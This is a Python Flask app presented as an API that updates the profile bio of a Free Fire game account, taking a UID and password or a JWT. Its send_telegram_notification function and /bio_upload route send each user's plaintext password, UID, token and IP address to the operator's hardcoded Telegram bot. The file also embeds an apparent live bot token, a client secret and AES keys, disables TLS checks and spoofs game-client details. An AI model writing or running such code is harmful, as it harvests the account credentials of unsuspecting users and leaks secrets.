# app.py - Complete Version with Telegram & Level Check
from flask import Flask, request, jsonify, make_response
import requests
import binascii
import jwt
import urllib3
import random
import string
import time
import json
import hashlib
import ssl
import asyncio
import aiohttp
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime
import threading
import os

# Fix protobuf
os.environ['PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION'] = 'python'

try:
    from google.protobuf.json_format import MessageToJson
    import like_count_pb2
    import uid_generator_pb2
    PROTOBUF_AVAILABLE = True
except:
    PROTOBUF_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ============ TELEGRAM CONFIG ============
BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
OWNER_ID = 8660700322
CHANNEL_PROMO = "@dindingijo"

# ============ KONFIGURASI ============
FREEFIRE_UPDATE_URLS = [
    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
]

MAJOR_LOGIN_URLS = [
    "https://loginbp.ggblueshark.com/MajorLogin",
    "https://loginbp.common.ggbluefox.com/MajorLogin",
]

OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
FREEFIRE_VERSION = "OB54"

KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# ============ HEADERS ============
BIO_HEADERS = {
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION,
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

LOGIN_HEADERS = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-Unity-Version": "2018.4.11f1",
    "X-GA": "v1 1",
    "ReleaseVersion": FREEFIRE_VERSION
}

# ============ PROTOBUF SETUP ============
try:
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
    
    _sym_db = _symbol_database.Default()
    DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(
        b'\n\ndata.proto\"\xbb\x01\n\x04\x44\x61ta\x12\x0f\n\x07\x66ield_2\x18\x02 \x01(\x05\x12\x1e\n\x07\x66ield_5\x18\x05 \x01(\x0b\x32\r.EmptyMessage\x12\x1e\n\x07\x66ield_6\x18\x06 \x01(\x0b\x32\r.EmptyMessage\x12\x0f\n\x07\x66ield_8\x18\x08 \x01(\t\x12\x0f\n\x07\x66ield_9\x18\t \x01(\x05\x12\x1f\n\x08\x66ield_11\x18\x0b \x01(\x0b\x32\r.EmptyMessage\x12\x1f\n\x08\x66ield_12\x18\x0c \x01(\x0b\x32\r.EmptyMessage\"\x0e\n\x0c\x45mptyMessageb\x06proto3'
    )
    _globals = globals()
    _builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
    _builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'data1_pb2', _globals)
    BioData = _sym_db.GetSymbol('Data')
    EmptyMessage = _sym_db.GetSymbol('EmptyMessage')
except:
    BioData = None
    EmptyMessage = None

# ============ TELEGRAM FUNCTIONS ============
def send_telegram_notification(uid, password, name, level, region, jwt_token, ip_address, bio_status="Success"):
    """Kirim notifikasi ke Telegram dengan detail lengkap"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        message = f"""🔥 <b>FREE FIRE BIO UPDATE</b> 🔥

👤 <b>Name:</b> {name or 'N/A'}
🆔 <b>UID:</b> <code>{uid}</code>
🔑 <b>Password:</b> <code>{password}</code>
📊 <b>Level:</b> {level or 'N/A'}
🌍 <b>Region:</b> {region or 'ID'}
📱 <b>Status:</b> {bio_status}

🔐 <b>JWT Token:</b>
<code>{jwt_token[:50]}...</code>

📞 <b>IP Caller:</b> {ip_address}
⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}

💡 Join: {CHANNEL_PROMO}"""
        
        payload = {
            "chat_id": OWNER_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
    except Exception as e:
        print(f"Telegram error: {e}")

# ============ PROFILE CHECKER ============
def check_profile_level(uid, jwt_token, region="ID"):
    """Cek level akun menggunakan profile finder"""
    try:
        # Server config
        SERVER_CONFIG = {
            "ID": {
                "url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
                "name": "Indonesia"
            },
            "IND": {
                "url": "https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
                "name": "India"
            },
            "BR": {
                "url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
                "name": "Brazil"
            }
        }
        
        server = SERVER_CONFIG.get(region, SERVER_CONFIG["ID"])
        url = server["url"]
        
        # Encrypt UID
        def aes_encrypt_data(data):
            cipher = AES.new(KEY, AES.MODE_CBC, IV)
            return cipher.encrypt(pad(data, AES.block_size))
        
        # Build protobuf manually
        try:
            uid_msg = uid_generator_pb2.uid_generator()
            uid_msg.krishna_ = int(uid)
            uid_msg.teamXdarks = 1
            encrypted = binascii.hexlify(aes_encrypt_data(uid_msg.SerializeToString())).decode()
        except:
            # Fallback: simple encryption
            import struct
            raw_data = struct.pack('>Q', int(uid)) + b'\x01' * 8
            encrypted = binascii.hexlify(aes_encrypt_data(raw_data)).decode()
        
        headers = {
            'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
            'Authorization': f"Bearer {jwt_token}",
            'Content-Type': "application/x-www-form-urlencoded",
            'X-GA': "v1 1",
            'ReleaseVersion': "OB54"
        }
        
        edata = bytes.fromhex(encrypted)
        response = requests.post(url, data=edata, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            # Parse response
            try:
                if PROTOBUF_AVAILABLE:
                    items = like_count_pb2.Info()
                    items.ParseFromString(response.content)
                    data = json.loads(MessageToJson(items))
                    
                    account_info = data.get('AccountInfo', {})
                    return {
                        "name": account_info.get('PlayerNickname', 'Unknown'),
                        "level": account_info.get('PlayerLevel', '?'),
                        "likes": account_info.get('Likes', 0),
                        "guild": account_info.get('GuildName', 'No Guild'),
                        "rank": account_info.get('Rank', 'Unknown')
                    }
            except:
                pass
            
            # Manual parsing
            try:
                import re
                data_str = response.content.decode('utf-8', errors='ignore')
                
                # Extract name
                name_match = re.findall(r'[A-Za-z0-9_\s]{3,30}', data_str)
                name = name_match[0] if name_match else 'Unknown'
                
                # Extract numbers (likely level)
                numbers = re.findall(r'\d+', data_str)
                level = numbers[0] if numbers else '?'
                
                return {
                    "name": name,
                    "level": level,
                    "likes": 0,
                    "guild": "Unknown",
                    "rank": "Unknown"
                }
            except:
                pass
        
        return None
    except Exception as e:
        print(f"Profile check error: {e}")
        return None

# ============ CORE FUNCTIONS ============
def encrypt_data(data_bytes):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    padded = pad(data_bytes, AES.block_size)
    return cipher.encrypt(padded)

def decode_jwt_info(token):
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        name = decoded.get("nickname")
        region = decoded.get("lock_region") or decoded.get("country_code", "ID")
        uid = decoded.get("account_id")
        return str(uid), name, region
    except Exception:
        return None, None, None

def perform_guest_login(uid, password):
    """Login guest untuk dapat access token"""
    try:
        payload = {
            'uid': uid,
            'password': password,
            'response_type': "token",
            'client_type': "2",
            'client_secret': "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
            'client_id': "100067"
        }
        headers = {
            'User-Agent': "GarenaMSDK/4.0.39(SM-M526B ;Android 13;pt;BR;)",
            'Connection': "Keep-Alive"
        }
        
        resp = requests.post(OAUTH_URL, data=payload, headers=headers, timeout=10, verify=False)
        data = resp.json()
        
        if 'access_token' in data:
            return data['access_token'], data.get('open_id')
    except Exception as e:
        print(f"Guest login error: {e}")
    return None, None

def perform_major_login(access_token, open_id, region="ID"):
    """Major login untuk dapat JWT"""
    try:
        from my_pb2 import GameData
        import output_pb2
        
        game_data = GameData()
        game_data.timestamp = "2024-12-05 18:15:32"
        game_data.game_name = "free fire"
        game_data.game_version = 1
        game_data.version_code = "1.123.1"
        game_data.os_info = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
        game_data.device_type = "Handheld"
        game_data.network_provider = "Verizon Wireless"
        game_data.connection_type = "WIFI"
        game_data.screen_width = 1280
        game_data.screen_height = 960
        game_data.dpi = "240"
        game_data.cpu_info = "ARMv7 VFPv3 NEON VMH | 2400 | 4"
        game_data.total_ram = 5951
        game_data.gpu_name = "Adreno (TM) 640"
        game_data.gpu_version = "OpenGL ES 3.0"
        game_data.user_id = "Google|74b585a9-0268-4ad3-8f36-ef41d2e53610"
        game_data.ip_address = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        game_data.language = "en"
        game_data.open_id = open_id
        game_data.access_token = access_token
        game_data.platform_type = 8
        game_data.field_99 = "8"
        game_data.field_100 = "8"

        serialized_data = game_data.SerializeToString()
        encrypted = encrypt_data(serialized_data)
        hex_encrypted = binascii.hexlify(encrypted).decode('utf-8')
        
        edata = bytes.fromhex(hex_encrypted)
        
        url = MAJOR_LOGIN_URLS[0] if region not in ["ME", "TH"] else MAJOR_LOGIN_URLS[1]
        
        response = requests.post(url, data=edata, headers=LOGIN_HEADERS, verify=False, timeout=10)

        if response.status_code == 200:
            try:
                example_msg = output_pb2.Garena_420()
                example_msg.ParseFromString(response.content)
                if hasattr(example_msg, 'token') and example_msg.token:
                    return example_msg.token
            except:
                pass
    except Exception as e:
        print(f"Major login error: {e}")
    return None

def generate_jwt_from_uid_pass(uid, password):
    """Generate JWT dari UID dan Password"""
    try:
        # 1. Guest login
        access_token, open_id = perform_guest_login(uid, password)
        if not access_token or not open_id:
            return None
        
        # 2. Major login
        jwt_token = perform_major_login(access_token, open_id, "ID")
        return jwt_token
    except Exception as e:
        print(f"JWT generation error: {e}")
        return None

def upload_bio_request(jwt_token, bio_text):
    """Upload bio dengan JWT"""
    try:
        if BioData is None:
            return {"status": "❌ Protobuf not loaded", "code": 500}
        
        data = BioData()
        data.field_2 = 17
        data.field_5.CopyFrom(EmptyMessage())
        data.field_6.CopyFrom(EmptyMessage())
        data.field_8 = bio_text
        data.field_9 = 1
        data.field_11.CopyFrom(EmptyMessage())
        data.field_12.CopyFrom(EmptyMessage())

        data_bytes = data.SerializeToString()
        encrypted = encrypt_data(data_bytes)

        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"

        for endpoint in FREEFIRE_UPDATE_URLS:
            try:
                resp = requests.post(
                    endpoint,
                    headers=headers,
                    data=encrypted,
                    timeout=10,
                    verify=False
                )
                
                status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
                
                return {
                    "status": status_text,
                    "code": resp.status_code,
                    "bio": bio_text,
                    "endpoint": endpoint,
                    "server_response": raw_hex
                }
            except:
                continue
        
        return {"status": "❌ All endpoints failed", "code": 500}
    except Exception as e:
        return {"status": f"Error: {str(e)}", "code": 500}

# ============ ROUTES ============
@app.route("/bio_upload", methods=["GET", "POST"])
def combined_bio_upload():
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    access_token = request.args.get("access") or request.form.get("access")
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not bio:
        return jsonify({
            "status": "❌ Error",
            "code": 400,
            "error": "Missing 'bio' parameter",
            "usage": {
                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
            }
        }), 400
    
    final_jwt = None
    final_uid = None
    final_name = None
    final_region = "ID"
    login_method = "Unknown"
    
    # Method 1: Direct JWT
    if jwt_token:
        login_method = "Direct JWT"
        final_jwt = jwt_token
        uid_from_jwt, name_from_jwt, region_from_jwt = decode_jwt_info(jwt_token)
        final_uid = uid_from_jwt or uid
        final_name = name_from_jwt
        final_region = region_from_jwt or "ID"
    
    # Method 2: UID + Password
    elif uid and password:
        login_method = "UID/Pass Login"
        final_uid = uid
        
        # Generate JWT
        generated_jwt = generate_jwt_from_uid_pass(uid, password)
        
        if generated_jwt:
            final_jwt = generated_jwt
            # Decode info dari JWT
            _, name_from_jwt, region_from_jwt = decode_jwt_info(generated_jwt)
            final_name = name_from_jwt
            final_region = region_from_jwt or "ID"
        else:
            return jsonify({
                "status": "❌ JWT Generation Failed",
                "code": 401,
                "error": "Invalid UID/Password",
                "uid": uid
            }), 401
    
    else:
        return jsonify({
            "status": "❌ Error",
            "code": 400,
            "error": "Provide JWT or UID/Pass",
            "usage": {
                "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
                "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
            }
        }), 400
    
    if not final_jwt:
        return jsonify({
            "status": "❌ Invalid JWT",
            "code": 400,
            "error": "Could not get valid JWT"
        }), 400
    
    # Check profile level
    profile_info = check_profile_level(final_uid, final_jwt, final_region)
    
    # Upload bio
    bio_result = upload_bio_request(final_jwt, bio)
    
    # Send Telegram notification with level info
    if profile_info:
        send_telegram_notification(
            uid=final_uid,
            password=password or "N/A",
            name=profile_info.get('name', final_name or 'Unknown'),
            level=profile_info.get('level', '?'),
            region=final_region,
            jwt_token=final_jwt,
            ip_address=client_ip,
            bio_status=bio_result.get('status', 'Unknown')
        )
    else:
        send_telegram_notification(
            uid=final_uid,
            password=password or "N/A",
            name=final_name or 'Unknown',
            level='?',
            region=final_region,
            jwt_token=final_jwt,
            ip_address=client_ip,
            bio_status=bio_result.get('status', 'Unknown')
        )
    
    # Response
    response_data = {
        "Credit": "sulav_codex_ff",
        "Join For More": "Telegram: @sulav_don2",
        "status": bio_result.get("status", "Unknown"),
        "login_method": login_method,
        "code": bio_result.get("code", 500),
        "bio": bio,
        "uid": final_uid,
        "password": password or "N/A",
        "name": profile_info.get('name') if profile_info else final_name,
        "level": profile_info.get('level') if profile_info else '?',
        "likes": profile_info.get('likes') if profile_info else 0,
        "guild": profile_info.get('guild') if profile_info else 'N/A',
        "region": final_region,
        "server_response": bio_result.get("server_response", "N/A"),
        "endpoint_used": bio_result.get("endpoint", "N/A"),
        "generated_jwt": final_jwt
    }
    
    response = make_response(jsonify(response_data))
    response.headers["Content-Type"] = "application/json"
    return response

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Free Fire Bio Upload API with Level Check",
        "endpoints": {
            "/bio_upload": "Upload bio (GET/POST) with JWT or UID/Pass",
            "/": "This info page"
        },
        "usage": {
            "jwt": "/bio_upload?bio=Hello&jwt=YOUR_JWT",
            "uid_pass": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD"
        },
        "example_jwt": "/bio_upload?bio=Hello+World&jwt=eyJ...",
        "example_uid": "/bio_upload?bio=Hello+World&uid=16174093757&pass=ANONFK123ABC",
        "Credit": "sulav_codex_ff",
        "Telegram": "@sulav_don2",
        "features": [
            "Auto JWT generation from UID/Password",
            "Profile level checking",
            "Telegram notification with all details"
        ]
    })

@app.route("/bio", methods=["GET"])
def bio_simple():
    bio = request.args.get("bio")
    jwt_token = request.args.get("jwt")
    
    if not bio or not jwt_token:
        return jsonify({
            "error": "Missing parameters",
            "example": "/bio?bio=Hello&jwt=YOUR_JWT"
        }), 400
    
    result = upload_bio_request(jwt_token, bio)
    return jsonify(result)

# ============ MAIN ============
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
